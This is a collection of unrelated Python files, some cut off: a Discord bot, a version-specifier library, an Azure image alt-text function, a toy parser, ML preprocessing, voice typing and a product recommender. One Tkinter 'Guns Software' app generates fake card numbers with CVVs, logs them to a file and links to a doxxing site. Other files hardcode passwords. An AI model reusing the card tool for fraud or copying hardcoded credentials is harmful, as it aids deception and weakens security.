    "# -*- coding: utf-8 -*-\n\"\"\"\nThis is a Discord bot implemented using the disnake library.\n\nIt handles various events and commands for interaction on a Discord server.\n\"\"\"\n\nimport os\n\nimport disnake\nimport sentry_sdk\nfrom disnake.ext import commands\n\nimport config\nfrom context_menu import ContextMenuCommands\nfrom db.sqlite_handler import db_setup\nfrom helper import sentry_capture\n\nsentry_sdk.init(\n    dsn=config.SENTRY_DSN,\n    traces_sample_rate=1.0,\n    profiles_sample_rate=1.0,\n)\n\nintents = disnake.Intents.all()\nintents.presences = False\n\nbot = commands.Bot(\n    intents=intents,\n    command_prefix=\"!!!\",\n    help_command=None,\n    command_sync_flags=commands.CommandSyncFlags.all(),\n)\n\n\n@bot.event\nasync def on_ready():\n    \"\"\"\n    Event handler that is called when the bot is ready to start receiving events from\n    Discord.\n\n    This function prints a message to indicate that the bot has connected to Discord and then\n    initializes the database.\n    It also loads all the command extensions from the \"./commands\" directory.\n\n    Args:\n        None\n\n    Returns:\n        None\n    \"\"\"\n    print(f\"{bot.user} has connected to Discord!\")\n    await db_setup()  # Setup the database\n\n    for filename in os.listdir(\"./commands\"):\n        if filename.endswith(\".py\") and not filename.startswith(\"_\"):\n            extension = filename[:-3]\n            try:\n                bot.load_extension(f\"commands.{extension}\")\n                print(f\"Loaded extension: {extension}\")\n            except commands.errors.ExtensionNotFound as e:\n                sentry_capture(\n                    commands.errors.ExtensionNotFound(\n                        f\"Extension not found: {extension}\"\n                    ),\n                    0,\n                    0,\n                )\n                print(f\"Failed to load extension {extension}.\", e)\n    bot.add_cog(ContextMenuCommands(bot))\n\n\nbot.run(config.TOKEN)\n",
    "# This file is dual licensed under the terms of the Apache License, Version\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\n# for complete details.\n\nimport abc\nimport functools\nimport itertools\nimport re\nimport warnings\nfrom typing import (\n    Callable,\n    Dict,\n    Iterable,\n    Iterator,\n    List,\n    Optional,\n    Pattern,\n    Set,\n    Tuple,\n    TypeVar,\n    Union,\n)\n\nfrom .utils import canonicalize_version\nfrom .version import LegacyVersion, Version, parse\n\nParsedVersion = Union[Version, LegacyVersion]\nUnparsedVersion = Union[Version, LegacyVersion, str]\nVersionTypeVar = TypeVar(\"VersionTypeVar\", bound=UnparsedVersion)\nCallableOperator = Callable[[ParsedVersion, str], bool]\n\n\nclass InvalidSpecifier(ValueError):\n    \"\"\"\n    An invalid specifier was found, users should refer to PEP 440.\n    \"\"\"\n\n\nclass BaseSpecifier(metaclass=abc.ABCMeta):\n    @abc.abstractmethod\n    def __str__(self) -> str:\n        \"\"\"\n        Returns the str representation of this Specifier like object. This\n        should be representative of the Specifier itself.\n        \"\"\"\n\n    @abc.abstractmethod\n    def __hash__(self) -> int:\n        \"\"\"\n        Returns a hash value for this Specifier like object.\n        \"\"\"\n\n    @abc.abstractmethod\n    def __eq__(self, other: object) -> bool:\n        \"\"\"\n        Returns a boolean representing whether or not the two Specifier like\n        objects are equal.\n        \"\"\"\n\n    @abc.abstractproperty\n    def prereleases(self) -> Optional[bool]:\n        \"\"\"\n        Returns whether or not pre-releases as a whole are allowed by this\n        specifier.\n        \"\"\"\n\n    @prereleases.setter\n    def prereleases(self, value: bool) -> None:\n        \"\"\"\n        Sets whether or not pre-releases as a whole are allowed by this\n        specifier.\n        \"\"\"\n\n    @abc.abstractmethod\n    def contains(self, item: str, prereleases: Optional[bool] = None) -> bool:\n        \"\"\"\n        Determines if the given item is contained within this specifier.\n        \"\"\"\n\n    @abc.abstractmethod\n    def filter(\n        self, iterable: Iterable[VersionTypeVar], prereleases: Optional[bool] = None\n    ) -> Iterable[VersionTypeVar]:\n        \"\"\"\n        Takes an iterable of items and filters them so that only items which\n        are contained within this specifier are allowed in it.\n        \"\"\"\n\n\nclass _IndividualSpecifier(BaseSpecifier):\n\n    _operators: Dict[str, str] = {}\n    _regex: Pattern[str]\n\n    def __init__(self, spec: str = \"\", prereleases: Optional[bool] = None) -> None:\n        match = self._regex.search(spec)\n        if not match:\n            raise InvalidSpecifier(f\"Invalid specifier: '{spec}'\")\n\n        self._spec: Tuple[str, str] = (\n            match.group(\"operator\").strip(),\n            match.group(\"version\").strip(),\n        )\n\n        # Store whether or not this Specifier should accept prereleases\n        self._prereleases = prereleases\n\n    def __repr__(self) -> str:\n        pre = (\n            f\", prereleases={self.prereleases!r}\"\n            if self._prereleases is not None\n            else \"\"\n        )\n\n        return f\"<{self.__class__.__name__}({str(self)!r}{pre})>\"\n\n    def __str__(self) -> str:\n        return \"{}{}\".format(*self._spec)\n\n    @property\n    def _canonical_spec(self) -> Tuple[str, str]:\n        return self._spec[0], canonicalize_version(self._spec[1])\n\n    def __hash__(self) -> int:\n        return hash(self._canonical_spec)\n\n    def __eq__(self, other: object) -> bool:\n        if isinstance(other, str):\n            try:\n                other = self.__class__(str(other))\n            except InvalidSpecifier:\n                return NotImplemented\n        elif not isinstance(other, self.__class__):\n            return NotImplemented\n\n        return self._canonical_spec == other._canonical_spec\n\n    def _get_operator(self, op: str) -> CallableOperator:\n        operator_callable: CallableOperator = getattr(\n            self, f\"_compare_{self._operators[op]}\"\n        )\n        return operator_callable\n\n    def _coerce_version(self, version: UnparsedVersion) -> ParsedVersion:\n        if not isinstance(version, (LegacyVersion, Version)):\n            version = parse(version)\n        return version\n\n    @property\n    def operator(self) -> str:\n        return self._spec[0]\n\n    @property\n    def version(self) -> str:\n        return self._spec[1]\n\n    @property\n    def prereleases(self) -> Optional[bool]:\n        return self._prereleases\n\n    @prereleases.setter\n    def prereleases(self, value: bool) -> None:\n        self._prereleases = value\n\n    def __contains__(self, item: str) -> bool:\n        return self.contains(item)\n\n    def contains(\n        self, item: UnparsedVersion, prereleases: Optional[bool] = None\n    ) -> bool:\n\n        # Determine if prereleases are to be allowed or not.\n        if prereleases is None:\n            prereleases = self.prereleases\n\n        # Normalize item to a Version or LegacyVersion, this allows us to have\n        # a shortcut for ``\"2.0",
    "import logging\nimport os\nfrom datetime import datetime, timedelta\nimport azure.functions as func\nfrom azure.storage.blob import BlobServiceClient, generate_blob_sas, BlobSasPermissions\nfrom azure.core.exceptions import ResourceNotFoundError\nfrom azure.cosmos import CosmosClient, exceptions\nfrom azure.cosmos.exceptions import CosmosResourceExistsError\nfrom openai import AzureOpenAI\n\nallowed_extensions = ['.png', '.jpeg', '.jpg', '.tiff', '.gif', '.bmp', '.webp']\n\ndef main(myblob: func.InputStream):\n    \n    \"\"\"\n    Cette fonction est d\u00e9clench\u00e9e lorsqu'un blob est t\u00e9l\u00e9charg\u00e9 dans le conteneur sp\u00e9cifi\u00e9.\n    Si l'extension du fichier est autoris\u00e9e, g\u00e9n\u00e8re une description et l'ins\u00e8re dans CosmosDB.\n    SI l'extension du fichier n'est pas autoris\u00e9e, le fichier est automatiquement supprim\u00e9.\n    \"\"\"\n    logging.info(f\"Processed blob\\nName: {myblob.name}\\nSize: {myblob.length} bytes\")\n\n    file_name = os.path.basename(myblob.name)\n    file_extension = os.path.splitext(file_name)[1].lower()\n    container_name = \"images-description\"\n    connect_str = os.getenv('images06_STORAGE')\n\n    URL = os.environ['ACCOUNT_URI']\n    KEY = os.environ['ACCOUNT_KEY']\n    client = CosmosClient(URL, credential=KEY)\n    DATABASE_NAME = 'descriptions'\n    CONTAINER_NAME = 'products_descriptions'\n    database = client.get_database_client(DATABASE_NAME)\n    container = database.get_container_client(CONTAINER_NAME)\n    \n    full_path = myblob.name\n    extracted_path = '/'.join(full_path.split('/')[1:])\n    \n    if file_extension in allowed_extensions:\n\n        if not check_description_exists(file_name, container):\n\n            sas_url = generate_blob_sas_url(container_name, connect_str, full_path)\n            description = generate_image_description(sas_url)\n            insert_into_cosmosdb([description], container)\n\n        else:\n\n            logging.info(f\"Description already exists for blob {file_name}. No action taken.\")\n\n    else:\n\n        try:\n\n            blob_service_client = BlobServiceClient.from_connection_string(connect_str)\n            blob_container_client = blob_service_client.get_container_client(container_name)\n            blob_client = blob_container_client.get_blob_client(extracted_path)\n            blob_client.delete_blob()\n            logging.info(f\"Blob {extracted_path} deleted successfully as it is not an allowed file type.\")\n\n        except ResourceNotFoundError:\n\n            logging.info(f\"Blob {extracted_path} does not exist. No deletion needed.\")\n\n        except Exception as e:\n\n            logging.error(f\"Could not delete blob: {extracted_path}. Error: {e}\")\n\n\n\ndef generate_blob_sas_url(container_name: str, connection_string: str, blob_path: str):\n\n    blob_service_client = BlobServiceClient.from_connection_string(connection_string)\n    account_key = os.getenv('key_storage_account')\n    blob_name = '/'.join(blob_path.split('/')[1:])\n    sas_token = generate_blob_sas(account_name=blob_service_client.account_name,\n                                  account_key=account_key,\n                                  container_name=container_name,\n                                  blob_name=blob_name,\n                                  permission=BlobSasPermissions(read=True),\n                                  expiry=datetime.utcnow() + timedelta(hours=1))\n    return f\"https://{blob_service_client.account_name}.blob.core.windows.net/{container_name}/{blob_name}?{sas_token}\"\n\n\n\n\ndef generate_image_description(blob_url_with_sas: str) -> dict:\n\n    api_base = os.getenv(\"AZURE_OPENAI_ENDPOINT\")\n    api_key = os.getenv(\"AZURE_OPENAI_API_KEY\")\n    api_version = '2024-02-15-preview'\n\n    client = AzureOpenAI(\n        api_key=api_key,\n        api_version=api_version,\n        azure_endpoint=api_base\n    )\n\n    response = client.chat.completions.create(\n        model=\"image-bot\",\n        messages=[\n            {\"role\": \"system\", \"content\": \"You are a french SEO expert, with many years of experience.\"},\n            {\"role\": \"user\", \"content\": [\n                {\"type\": \"text\", \"text\": \"Generate an SEO compliant sentence for product image alt-text in french. Focus on the product, not the background objects.\"},\n                {\"type\": \"image_url\", \"image_url\": {\"url\": blob_url_with_sas}}\n            ]}\n        ],\n        max_tokens=300\n    )\n\n    description = response.choices[0].message.content\n\n    return {\"url\": blob_url_with_sas.split('?')[0], \"description\": description}\n\n\n\n\ndef insert_into_cosmosdb(alt_texts: list, container):\n    for alt_text in alt_texts:\n        try:\n            item = {'id': alt_text['url'].split('/')[-1], 'url': alt_text['url'], 'description': alt_text['description']}\n            container.create_item(body=item)\n        except CosmosResourceExistsError as e:\n            logging.warning(f\"Item with id {item['id']} already exists in Cosmos DB. No new item created. Error: {e}\")\n        except exceptions.CosmosHttpResponseError as e:\n            logging.error(f\"Could not insert item into Cosmos DB. Error: {e}\")\n\n\n\n\nd",
    "\"\"\"\r\nThis is a Toy interpreter for Canfig Language, Not put in Production environment\r\n\r\nIn the future, I'll put the parsing and evaluating process in OCaml\r\n\r\n\"\"\"\r\n\r\nimport sys\r\nimport os\r\nimport subprocess\r\nfrom typing import List\r\nimport re\r\nimport pickle\r\nimport hashlib\r\n\r\nfrom common import Token, TokenType, TagTokenType\r\nfrom utils import *\r\n\r\nfrom transitions import Machine\r\nfrom enum import Enum, auto\r\n\r\nBUF_SIZE = 65536  # file read buf\r\nmd5 = hashlib.md5()\r\n\r\n# parse result\r\nmeta_data: dict = {}\r\nsql_query: list = []\r\ntriggers: list = []\r\nslices: list = []\r\n\r\n\r\nclass HandleFlag(Enum):\r\n    STRUCT = auto()\r\n    CONFIG = auto()\r\n    TRIGGER = auto()\r\n    SLICE = auto()\r\n    NONE = auto()\r\n\r\n\r\nclass Parser(object):\r\n    states = (\r\n        [token._name_ for token in TokenType]\r\n        + [\"start\", \"error\"]\r\n        + [\"do_push_kv\", \"do_sql\", \"do_pre_sql\", \"do_slice\"]\r\n    )\r\n\r\n    def __init__(self):\r\n        self.kv_prev_state = \"\"\r\n        self.state_buffer = \"\"\r\n\r\n        self.ident_buffer = \"\"\r\n        self.arg_buffer = \"\"\r\n\r\n        self.err_msg = \"\"\r\n\r\n        self.cur_handling = HandleFlag.NONE\r\n\r\n        self.machine = Machine(model=self, states=Parser.states, initial=\"start\")\r\n\r\n        # start state -> *\r\n        for state in self.states:\r\n            self.machine.add_transition(trigger=state, source=\"start\", dest=state)\r\n\r\n        # next command\r\n        self.machine.add_transition(trigger=\"SEMI\", source=\"*\", dest=\"start\")\r\n\r\n        # tag token handling\r\n        for tag_state in [token._name_ for token in TagTokenType]:\r\n            self.machine.add_transition(\r\n                trigger=\"STRING\",\r\n                source=tag_state,\r\n                dest=\"do_push_kv\",\r\n                before=\"push_kv\",\r\n                after=\"push_kv\",\r\n            )\r\n\r\n        # struct handling\r\n        self.machine.add_transition(\r\n            trigger=\"IDENT\", source=\"STRUCT\", dest=\"IDENT\", after=\"struct_handler\"\r\n        )\r\n        self.machine.add_transition(\r\n            trigger=\"IDENT\", source=\"IDENT\", dest=\"IDENT\", after=\"edge_case_handler\"\r\n        )  # edge case\r\n\r\n        # argument handling\r\n        self.machine.add_transition(\r\n            trigger=\"ARGUMENT\", source=\"IDENT\", dest=\"ARGUMENT\", after=\"arg_handler\"\r\n        )\r\n\r\n        # config handling\r\n        self.machine.add_transition(\r\n            trigger=\"IDENT\", source=\"CONFIG\", dest=\"IDENT\", after=\"config_handler\"\r\n        )\r\n\r\n        # trigger handling\r\n        self.machine.add_transition(\r\n            trigger=\"IDENT\", source=\"TRIGGER\", dest=\"IDENT\", after=\"trigger_handler\"\r\n        )\r\n        self.machine.add_transition(trigger=\"TRICOND\", source=\"IDENT\", dest=\"TRICOND\")\r\n        self.machine.add_transition(\r\n            trigger=\"IDENT\", source=\"TRICOND\", dest=\"IDENT\", before=\"trigger_handler\"\r\n        )\r\n\r\n        # slice handling\r\n        self.machine.add_transition(\r\n            trigger=\"IDENT\", source=\"SLICE\", dest=\"IDENT\", after=\"slice_handler\"\r\n        )\r\n\r\n        # command handling\r\n        self.machine.add_transition(\r\n            trigger=\"COMMAND\", source=\"IDENT\", dest=\"COMMAND\", before=\"command_handler\"\r\n        )\r\n        self.machine.add_transition(\r\n            trigger=\"COMMAND\",\r\n            source=\"ARGUMENT\",\r\n            dest=\"COMMAND\",\r\n            before=\"command_handler\",\r\n        )\r\n\r\n        # reject all unexpected state\r\n        for state in self.states:\r\n            self.machine.add_transition(\r\n                trigger=state, source=\"*\", dest=\"error\", before=\"raise_err\"\r\n            )\r\n\r\n        self.machine.add_transition(\r\n            trigger=\"ERROR\", source=\"*\", dest=\"error\", before=\"raise_err\"\r\n        )\r\n\r\n    def slice_handler(self):\r\n        self.cur_handling = HandleFlag.SLICE\r\n        self.ident_buffer = self.state_buffer\r\n\r\n    def arg_handler(self):\r\n        if self.cur_handling != HandleFlag.STRUCT:\r\n            self.err_msg = \"only STRUCT and TRIGGER type can have argument\"\r\n            self.ERROR()\r\n        self.arg_buffer = self.state_buffer\r\n\r\n    def config_handler(self):\r\n        if self.state == \"IDENT\":\r\n            self.cur_handling = HandleFlag.CONFIG\r\n            self.ident_buffer = self.state_buffer\r\n\r\n    def struct_handler(self):\r\n        if self.state == \"IDENT\":\r\n            self.cur_handling = HandleFlag.STRUCT\r\n            self.ident_buffer = self.state_buffer\r\n\r\n    def trigger_handler(self):\r\n        if self.state == \"IDENT\":\r\n            self.cur_handling = HandleFlag.TRIGGER\r\n            self.ident_buffer = self.state_buffer\r\n\r\n        if self.state == \"TRICOND\":\r\n            if self.cur_handling != HandleFlag.TRIGGER:\r\n                self.err_msg = \"'WHEN CHANGE' can only use with Trigger\"\r\n                self.ERROR()\r\n\r\n            self.ident_buffer += \"|\" + self.state_buffer\r\n\r\n    def edge_case_handler(self):\r\n        if self.cur_handling != HandleFlag.STRUCT:\r\n            self.err_msg = \"identifier cannot follow identifier\"\r\n            self.ERROR()\r\n        else:\r\n         ",
    "import tkinter as tk\r\nimport webbrowser\r\nfrom faker import Faker\r\n\r\ndef zaloguj():\r\n    username = entry_username.get()\r\n    password = entry_password.get()\r\n\r\n    if username == \"Guns\" and password == \"Guns123\":\r\n        label_info.config(text=\"Successfully logged in!\", fg=\"green\")\r\n        root.withdraw()\r\n        otworz_aplikacje()\r\n    else:\r\n        label_info.config(text=\"Login error. Try again!\", fg=\"red\")\r\n\r\ndef otworz_aplikacje():\r\n    app_window = tk.Toplevel()\r\n    app_window.title(\"Guns Software\")\r\n\r\n    button_open_website = tk.Button(app_window, text=\"Open Website\", command=otworz_strone, font=(\"Arial\", 12))\r\n    button_open_website.pack(padx=10, pady=5)\r\n\r\n    frame_buttons = tk.Frame(app_window)\r\n    frame_buttons.pack(padx=10, pady=5)\r\n\r\n    button_generate_visa_card = tk.Button(frame_buttons, text=\"Generate Visa Card\", command=lambda: generuj_karte_kredytowa('visa'), font=(\"Arial\", 12))\r\n    button_generate_visa_card.grid(row=0, column=0, padx=5)\r\n\r\n    button_generate_mastercard = tk.Button(frame_buttons, text=\"Generate Mastercard\", command=lambda: generuj_karte_kredytowa('mastercard'), font=(\"Arial\", 12))\r\n    button_generate_mastercard.grid(row=0, column=1, padx=5)\r\n\r\ndef otworz_strone():\r\n    webbrowser.open_new(\"https://doxbin.net/\")\r\n\r\ndef generuj_karte_kredytowa(typ_karty):\r\n    fake = Faker()\r\n    if typ_karty == 'visa':\r\n        numer_karty = fake.credit_card_number(card_type='visa16')\r\n    elif typ_karty == 'mastercard':\r\n        numer_karty = fake.credit_card_number(card_type='mastercard')\r\n    \r\n    data_waznosci = fake.credit_card_expire(start=\"now\", end=\"+10y\", date_format=\"%m/%y\")\r\n    ccv = fake.credit_card_security_code(card_type=typ_karty)\r\n    \r\n    label_credit_card.config(text=f\"Generated {typ_karty.capitalize()} Credit Card: {numer_karty}\\nExpiration Date: {data_waznosci}\\nCCV: {ccv}\", font=(\"Arial\", 12), fg=\"blue\")\r\n    \r\n    zapisz_do_pliku(numer_karty, data_waznosci, ccv)\r\n\r\ndef zapisz_do_pliku(numer_karty, data_waznosci, ccv):\r\n    with open(\"GunsSoftware_credit_cards.txt\", \"a\") as file:\r\n        file.write(f\"Card Number: {numer_karty}, Expiration Date: {data_waznosci}, CCV: {ccv}\\n\")\r\n\r\nroot = tk.Tk()\r\nroot.title(\"Guns Software\")\r\n\r\nlabel_username = tk.Label(root, text=\"Username:\", font=(\"Arial\", 12))\r\nlabel_username.grid(row=0, column=0, padx=10, pady=5)\r\n\r\nentry_username = tk.Entry(root, font=(\"Arial\", 12))\r\nentry_username.grid(row=0, column=1, padx=10, pady=5)\r\n\r\nlabel_password = tk.Label(root, text=\"Password:\", font=(\"Arial\", 12))\r\nlabel_password.grid(row=1, column=0, padx=10, pady=5)\r\n\r\nentry_password = tk.Entry(root, show=\"*\", font=(\"Arial\", 12))\r\nentry_password.grid(row=1, column=1, padx=10, pady=5)\r\n\r\nbutton_login = tk.Button(root, text=\"Login\", command=zaloguj, font=(\"Arial\", 12))\r\nbutton_login.grid(row=2, column=0, columnspan=2, padx=10, pady=5)\r\n\r\nlabel_info = tk.Label(root, text=\"\", font=(\"Arial\", 12))\r\nlabel_info.grid(row=3, column=0, columnspan=2, padx=10, pady=5)\r\n\r\nlabel_credit_card = tk.Label(root, text=\"\", font=(\"Arial\", 12))\r\nlabel_credit_card.grid(row=4, column=0, columnspan=2, padx=10, pady=5)\r\n\r\nroot.mainloop()\r\n",
    "#!/usr/bin/python3\n\n# Importing the Libraries\nimport numpy as np                    # A library for manipulating multidimensional arrays and mathematical calculations in Python \nimport matplotlib.pyplot as plt       # 2D plotting library for high-quality graphics \nimport pandas as pd                   # A library offering easy-to-use, high-performance data structures and data manipulation tools\n\n# Importing the dataset\ndataset = pd.read_csv('Data.csv')     # Reads data from a CSV file and loads it into a DataFrame\nX = dataset.iloc[:, :-1].values       # Characteristics matrix contains the characteristics or explanatory variables used to predict the target variable\ny = dataset.iloc[:, -1].values        # Dependent variable vector is a target variable you are trying to predict using the characteristics matrix - last column\n\nprint(X)\nprint(y)\n\n# Identify missing data (assumes that missing data is represented as NaN)\nmissing_data = dataset.isnull().sum()\n\n# Print the number of missing entries in each column\nprint(\"Missing data: \\n\", missing_data)\n\n# Taking care of missing data\n\"\"\"The SimpleImputer class is used to manage missing values in data by replacing them with a specified value.\"\"\"\nfrom sklearn.impute import SimpleImputer\n\n\"\"\"\nMissing values are represented by np.nan, which is NumPy's convention for missing values.\nStrategy='mean' specifies that the strategy for replacing missing values is to replace them\nwith the average of the values present in the respective column.\n\"\"\"\nimputer = SimpleImputer(missing_values=np.nan, strategy='mean')\n\n\"\"\"Calculates the average of the values in columns 1 to 2 of the matrix X.\"\"\"\nimputer.fit(X[:, 1:3])\n\n\"\"\"Replaces the missing values in columns 1 to 2 of the X matrix with the averages calculated previously.\"\"\"\nX[:, 1:3] = imputer.transform(X[:, 1:3])\n\nprint(X)\n\n# Encoding categorical data\n\n## Encoding the Independent Variable\n\"\"\"Apply different transformers to different columns in the dataset.\"\"\"\nfrom sklearn.compose import ColumnTransformer\n\n\"\"\"Encode categorical variables as binary variables.\"\"\"\nfrom sklearn.preprocessing import OneHotEncoder\n\n\"\"\"\nProcess the categorical variables in the first column and transform them into binary variables.\nThe other columns will simply be passed on unchanged using remainder='passthrough'.\n\"\"\"\nct = ColumnTransformer(transformers=[('encoder', OneHotEncoder(), [0])], remainder='passthrough')\n\n\"\"\"Applies the transformation to X and converts the result into a NumPy array and assigns it to variable X.\"\"\"\nX = np.array(ct.fit_transform(X))\n\nprint(X)\n\n## Encoding the Dependent Variable\n\"\"\"Encode categorical values into numerical values.\"\"\"\nfrom sklearn.preprocessing import LabelEncoder\nle = LabelEncoder()\ny = le.fit_transform(y)\n\nprint(y)\n\n# Splitting the dataset into the Training set and Test set\n\"\"\"\nDividing data into training and test groups is super important.\nIt helps to ensure that your model works well with new data and to estimate its performance fairly.\nIt also helps to spot problems such as overlearning and to fine-tune the model parameters.\n\"\"\"\n\n\"\"\"Used to divide data into training and test sets.\"\"\"\nfrom sklearn.model_selection import train_test_split\n\n\"\"\"\nX_train: the set of training characteristics.\nX_test: the set of test characteristics.\ny_train: the target values corresponding to the training set.\ny_test: the target values corresponding to the test set.\n\ntest_size = 0.2 specifies that 20% of the data will be used as the test set,\nwhile 80% will be used as the training set\n\nrandom_state = 1 means that if you run the code several times with the same random seed,\nyou will always obtain the same division of the data.\n\"\"\"\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2, random_state = 1)\n\nprint(X_train)\n\nprint(X_test)\n\nprint(y_train)\n\nprint(y_test)\n\n# Feature Scaling\n\"\"\"\nA data pre-processing technique widely used in machine learning to normalise the features of a dataset within a specific range.\nThis typically involves adjusting feature values to fall within a given range or have a specific distribution.\nThe two most common methods of feature are normalisation (or min-max scaling) and standardisation.\n\"\"\"\nfrom sklearn.preprocessing import StandardScaler\nscaler = StandardScaler()\nX_train[:, 3:] = scaler.fit_transform(X_train[:, 3:])\nX_test[:, 3:] = scaler.transform(X_test[:, 3:])\n\nprint(X_train)\n\nprint(X_test)",
    "import os\nimport torch\nimport queue\nimport numpy as np\nimport speech_recognition as sr\nimport pynput.keyboard\nfrom faster_whisper import WhisperModel\n\nkeyboard = pynput.keyboard.Controller()\n\nmodel_root = os.path.expanduser(\"~/.cache/whisper\")\naudio_model = WhisperModel(\"distil-small.en\", download_root=model_root, device=\"auto\", compute_type=\"int8\")\n\naudio_queue = queue.Queue()\n\nrecorder = sr.Recognizer()\nrecorder.energy_threshold = 300\nrecorder.dynamic_energy_threshold = False\nhallucinate_threshold = 40\n\nsource = sr.Microphone(sample_rate=16000)\nwith source: recorder.adjust_for_ambient_noise(source)\n\ndef record_queue_pop():\n    audio = b\"\".join([audio_queue.get() for _ in range(audio_queue.qsize())])\n    return sr.AudioData(audio,16000,2).get_raw_data()\n\ndef record_queue_push(_, audio):\n    audio_queue.put_nowait(audio.get_raw_data())\nrecorder.pause_threshold = 5\nrecorder.listen_in_background(source, record_queue_push, phrase_time_limit=5)\n\n\nwhile True:\n    audio_frame = np.frombuffer(record_queue_pop(), dtype=np.int16)\n\n    loudness = np.sqrt(np.mean(np.square(audio_frame)))\n    if loudness < hallucinate_threshold:\n        continue\n\n    to_write = ''\n    audio_data = audio_frame.flatten().astype(np.float32) / 32768.0\n    segments, _ = audio_model.transcribe(audio_data)\n    to_write = ''.join([segment.text for segment in segments])\n\n    if to_write: keyboard.type(to_write) # [\" \",\"\\n\"]:",
    "import pymysql\r\nimport pandas as pd\r\nimport numpy as np\r\nimport re\r\nfrom gensim.models import TfidfModel\r\nimport gensim, logging\r\nfrom gensim.models.doc2vec import Doc2Vec, TaggedDocument\r\nimport jieba\r\nfrom functools import reduce\r\nimport collections\r\n\r\n# \u83b7\u53d6mysql\u7684\u8fde\u63a5\r\nconn = pymysql.connect(\r\n    host=\"127.0.0.1\",  # \u9700\u8981\u8fde\u63a5\u7684\u6570\u636e\u5e93\u7684ip\r\n    port=3306,\r\n    user=\"root\",  # \u6570\u636e\u5e93\u7528\u6237\u540d\r\n    password=\"123456\",  # \u6570\u636e\u5e93\u5bc6\u7801\r\n    database=\"gouwuwang_db\",  # \u9700\u8981\u67e5\u8be2\u7684\u6570\u636e\u5e93\u540d\r\n)\r\n\r\ndef remove_punctuation(text):\r\n    '''\u5220\u9664\u6807\u70b9\u7b26\u53f7\u548c\u7a7a\u683c'''\r\n    # return re.sub('[^\\w\\s]', '', text)\r\n    text = re.sub(' ', '', text)\r\n    text = re.sub('[^\\w\\s]', '', text)\r\n    return text\r\n\r\n\r\ndef remove_html_tags(text):\r\n    text = re.sub('&nbsp;', '', text)\r\n    clean = re.compile('<.*?>')\r\n    return re.sub(clean, '', text)\r\n\r\n\r\n# \u8bbe\u7f6e Pandas \u6253\u5370\u9009\u9879\r\npd.set_option('display.max_rows', None)  # \u663e\u793a\u6240\u6709\u884c\r\npd.set_option('display.max_columns', None)  # \u663e\u793a\u6240\u6709\u5217\r\npd.set_option('display.width', None)  # \u4e0d\u6298\u53e0\u5355\u5143\u683c\r\n#pd.set_option('display.max_colwidth', None)  # \u663e\u793a\u5b8c\u6574\u7684\u5355\u5143\u683c\u5185\u5bb9\r\n\r\n'''\r\n- \u67e5\u8be2mysql\u6570\u636e\u5e93\u52a0\u8f7d\u7269\u54c1\u76f8\u5173\u8868\u7684\u6570\u636e\r\n- \u5229\u7528jieba\u5206\u8bcd\u7269\u54c1\u7684\u63cf\u8ff0\u5b57\u6bb5\u548c\u5206\u7c7b\u5b57\u6bb5\uff0c\r\n- \u5e76\u5c06\u7269\u54c1\u7684\u5206\u7c7b\u8bcd\u548c\u63cf\u8ff0\u5206\u8bcd\u4f5c\u4e3a\u7269\u54c1\u7684\u6807\u7b7e\r\n'''\r\ndef get_item_dataset():\r\n    query_sql = \"SELECT t_product.productId as itemId,t_product.productName as title,t_productclass.className as genres,t_product.productDesc as itemDesc FROM t_product inner join t_productclass on t_productclass.classId = t_product.productClassObj\"\r\n    items_df = pd.read_sql_query(query_sql,conn,index_col=\"itemId\")\r\n\r\n    items_df[\"itemDesc\"] = items_df[\"itemDesc\"].apply(lambda x: remove_html_tags(x))\r\n    items_df[\"itemDesc\"] = items_df[\"itemDesc\"].apply(lambda x: remove_punctuation(x))\r\n    items_df[\"itemDesc\"] = items_df[\"itemDesc\"].apply(lambda x: list(jieba.cut(x)))\r\n    # \u5c06\u7c7b\u522b\u8bcd\u5206\u5f00\r\n    items_df[\"genres\"] = items_df[\"genres\"].apply(lambda x: x.split(\"|\"))\r\n\r\n    # \u6784\u5efa\u6570\u636e\u96c6\uff0c\u5305\u542bId\u3001\u6807\u9898\u3001\u7c7b\u522b\u3001\u6807\u7b7e\u56db\u4e2a\u5b57\u6bb5\r\n    # \u5982\u679c\u6ca1\u6709\u6807\u7b7e\u6570\u636e\uff0c\u90a3\u4e48\u5c31\u66ff\u6362\u4e3a\u7a7a\u5217\u8868\r\n    # map(fun,\u53ef\u8fed\u4ee3\u5bf9\u8c61)\r\n    item_dataset = pd.DataFrame(\r\n        map(\r\n            lambda x: (x[0], x[1], x[2], x[2] + x[3]) if x[3] is not np.nan else (x[0], x[1], x[2], []),\r\n            items_df.itertuples())\r\n        , columns=[\"itemId\", \"title\", \"genres\", \"tags\"]\r\n    )\r\n    item_dataset.set_index(\"itemId\", inplace=True)\r\n    return item_dataset\r\n\r\n\r\n'''\r\n- \u5229\u7528\u7269\u54c1\u8868\u4e2d\u6bcf\u4e2aItem\u7684\u63cf\u8ff0\u5206\u8bcd\u6807\u7b7e\u4f5c\u4e3a\u7269\u54c1\u7684\u5019\u9009\u5173\u952e\u8bcd\r\n- \u5229\u7528TF\u00b7IDF\u8ba1\u7b97\u6bcf\u90e8\u4e2a\u7684\u6807\u7b7e\u7684tfidf\u503c\uff0c\u9009\u53d6TOP-N\u4e2a\u5173\u952e\u8bcd\u4f5c\u4e3a\u7269\u54c1\u753b\u50cf\u6807\u7b7e\r\n- \u5e76\u5c06\u7269\u54c1\u7684\u5206\u7c7b\u8bcd\u76f4\u63a5\u4f5c\u4e3a\u6bcf\u4e2a\u7269\u54c1\u7684\u753b\u50cf\u6807\u7b7e\r\n'''\r\ndef create_item_profile(item_dataset):\r\n    '''\r\n    \u4f7f\u7528tfidf\uff0c\u5206\u6790\u63d0\u53d6topn\u5173\u952e\u8bcd\r\n    :param movie_dataset:\r\n    :return:\r\n    '''\r\n    dataset = item_dataset[\"tags\"].values\r\n\r\n    from gensim.corpora import Dictionary\r\n    # \u6839\u636e\u6570\u636e\u96c6\u5efa\u7acb\u8bcd\u888b\uff0c\u5e76\u7edf\u8ba1\u8bcd\u9891\uff0c\u5c06\u6240\u6709\u8bcd\u653e\u5165\u4e00\u4e2a\u8bcd\u5178\uff0c\u4f7f\u7528\u7d22\u5f15\u8fdb\u884c\u83b7\u53d6\r\n    dct = Dictionary(dataset)\r\n    # \u6839\u636e\u5c06\u6bcf\u6761\u6570\u636e\uff0c\u8fd4\u56de\u5bf9\u5e94\u7684\u8bcd\u7d22\u5f15\u548c\u8bcd\u9891\r\n    corpus = [dct.doc2bow(line) for line in dataset]\r\n    # 